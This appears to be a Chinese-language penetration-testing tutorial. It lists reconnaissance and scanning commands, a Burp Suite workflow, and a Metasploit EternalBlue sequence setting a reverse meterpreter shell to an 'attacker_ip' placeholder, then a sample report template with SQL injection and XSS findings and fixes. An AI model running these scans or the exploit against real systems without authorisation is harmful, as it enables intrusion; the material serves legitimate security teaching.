# 渗透测试实战

## 核心知识点

### 一、信息收集

#### 1. 子域名枚举
```bash
# subfinder
subfinder -d example.com -o subdomains.txt

# amass
amass enum -d example.com

# 在线工具
# crt.sh: https://crt.sh/?q=%25.example.com
```

#### 2. 端口扫描
```bash
# Nmap
nmap -sV -sC -O target.com
nmap -p 1-65535 -T4 target.com
nmap -sU target.com  # UDP扫描

# Masscan
masscan -p1-65535 192.168.1.0/24 --rate=10000
```

#### 3. 目录扫描
```bash
# dirsearch
dirsearch -u https://example.com -e php,asp,aspx,jsp

# gobuster
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# ffuf
ffuf -u https://example.com/FUZZ -w wordlist.txt
```

### 二、漏洞扫描

```bash
# Nikto
nikto -h https://example.com

# Nuclei
nuclei -u https://example.com -t cves/

# OWASP ZAP
zap-cli quick-scan -s all -r https://example.com
```

### 三、常用工具

#### 1. Burp Suite
```
# 使用流程
1. 配置浏览器代理 -> 127.0.0.1:8080
2. 拦截请求（Proxy -> Intercept）
3. 发送到Repeater修改重发
4. 发送到Intruder进行模糊测试
5. 使用Scanner自动扫描漏洞
```

#### 2. Metasploit
```bash
# 搜索漏洞
msfconsole
search type:exploit platform:windows

# 使用漏洞
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit
```

# 渗透测试报告

## 1. 执行摘要
- 测试范围：example.com
- 测试时间：2025-01-01 ~ 2025-01-07
- 风险等级：高危

## 2. 发现的漏洞

### 2.1 SQL注入（高危）
- **位置：** /api/users?id=1
- **类型：** 基于时间的盲注
- **影响：** 可获取全部数据库数据
- **复现步骤：** ...
- **修复建议：** 使用参数化查询

### 2.2 XSS（中危）
- **位置：** /search?q=
- **类型：** 反射型XSS
- **影响：** 可窃取用户Cookie
- **修复建议：** 输出编码、CSP策略

## 3. 修复建议总结
1. 所有SQL查询使用参数化
2. 实施CSP策略
3. 添加安全头部
4. 升级依赖组件
